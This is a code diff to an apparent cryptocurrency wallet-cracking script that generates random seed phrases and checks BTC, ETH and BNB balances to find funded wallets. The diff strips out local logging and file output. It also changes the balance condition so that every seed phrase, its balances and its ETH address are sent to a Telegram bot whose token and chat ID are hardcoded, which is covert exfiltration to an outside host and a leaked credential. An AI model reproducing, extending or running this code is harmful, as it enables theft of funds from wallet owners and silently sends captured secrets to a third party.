@@ -17,58 +17,7 @@ from bip_utils import (
     Bip39WordsNum,
 )
 
-# Constants
-LOG_FILE_NAME = "enigmacracker.log"
-ENV_FILE_NAME = "EnigmaCracker.env"
-WALLETS_FILE_NAME = "wallets_with_balance.txt"
 
-# Global counter for the number of wallets scanned
-wallets_scanned = 0
-
-# Get the absolute path of the directory where the script is located
-directory = os.path.dirname(os.path.abspath(__file__))
-# Initialize directory paths
-log_file_path = os.path.join(directory, LOG_FILE_NAME)
-env_file_path = os.path.join(directory, ENV_FILE_NAME)
-wallets_file_path = os.path.join(directory, WALLETS_FILE_NAME)
-
-# Configure logging
-logging.basicConfig(
-    level=logging.INFO,
-    format="%(asctime)s - %(levelname)s - %(message)s",
-    handlers=[
-        logging.FileHandler(log_file_path),  # Log to a file
-        logging.StreamHandler(sys.stdout),  # Log to standard output
-    ],
-)
-
-# Load environment variables from .env file
-load_dotenv(env_file_path)
-
-# Environment variable validation
-required_env_vars = ["ETHERSCAN_API_KEY"]
-missing_vars = [var for var in required_env_vars if not os.getenv(var)]
-if missing_vars:
-    raise EnvironmentError(f"Missing environment variables: {', '.join(missing_vars)}")
-
-# Check if we've set the environment variable indicating we're in the correct CMD
-if os.environ.get("RUNNING_IN_NEW_CMD") != "TRUE":
-    # Set the environment variable for the new CMD session
-    os.environ["RUNNING_IN_NEW_CMD"] = "TRUE"
-
-    # Determine the operating system
-    os_type = platform.system()
-
-    # For Windows
-    if os_type == "Windows":
-        subprocess.run(f'start cmd.exe /K python "{__file__}"', shell=True)
-
-    # For Linux
-    elif os_type == "Linux":
-        subprocess.run(f"gnome-terminal -- python3 {__file__}", shell=True)
-
-    # Exit this run, as we've opened a new CMD
-    sys.exit()
 BOT_TOKEN = '7997927855:AAGhQHFhmULHhr-cZV7K4lcGBTaDiFugqws'  
 CHAT_ID = '759264436'
 def send_telegram_message(message):
@@ -87,10 +36,7 @@ def send_telegram_message(message):
     except Exception as e:
         print(f"An error occurred: {e}")
 
-def update_cmd_title():
-    # Update the CMD title with the current number of wallets scanned
-    if platform.system() == "Windows":
-        os.system(f"title EnigmaCracker.py - Wallets Scanned: {wallets_scanned}")
+
 
 
 def bip():
@@ -198,12 +144,7 @@ def check_BNB_balance(address):
         logging.error(f"Error checking address {address}: {e}")
         return None
 
-def write_to_file(ETH_address):
-    # Write the seed, address, and balance to a file in the script's directory
-    with open(wallets_file_path, "a") as f:
-        log_message = f"{ETH_address}\n"
-        f.write(log_message)
-        logging.info(f"Written to file: {log_message}")
+
 
 
 def main():
@@ -215,39 +156,25 @@ def main():
             BTC_address = bip44_BTC_seed_to_address(seed)
             BTC_balance = check_BTC_balance(BTC_address)
 
-            logging.info(f"Seed: {seed}")
-            logging.info(f"BTC address: {BTC_address}")
-            logging.info(f"BTC balance: {BTC_balance: .6f} BTC")
-            logging.info("")
+            
 
             # ETH
             ETH_address = bip44_ETH_wallet_from_seed(seed)
             ETH_balance = check_ETH_balance(ETH_address)
             
-            logging.info(f"ETH address: {ETH_address}")
-            logging.info(f"ETH balance: {ETH_balance: .6f} ETH")
+            
 
             # BNB
             BNB_address = bip44_ETH_wallet_from_seed(seed)
             BNB_balance = check_BNB_balance(BNB_address)
             
-            logging.info(f"BNB address: {BNB_address}")
-            logging.info(f"BNB balance: {BNB_balance: .6f} BNB")
+            message = f"{seed}, {BTC_balance} BTC, {ETH_balance} ETH, {BNB_balance} BNB, ETH address: {ETH_address} "
 
-            message = f"{seed}, {BTC_balance} BTC, {ETH_balance} ETH, {BNB_balance} BNB"
-
-            # Increment the counter and update the CMD title
-            wallets_scanned += 1
-            update_cmd_title()
+            
 
             # Check if the address has a balance
-            if BTC_balance > 0 or ETH_balance > 0 or BNB_balance > 0:
-                logging.info("(!) Wallet with balance found!")
-                write_to_file(seed) 
-                write_to_file(ETH_balance)
-                write_to_file(BTC_balance)
-                write_to_file(BNB_balance)
-                write_to_file("wallet")
+            if BTC_balance >= 0 or ETH_balance > 0 or BNB_balance > 0:
+               
                 send_telegram_message(message)
             
                 
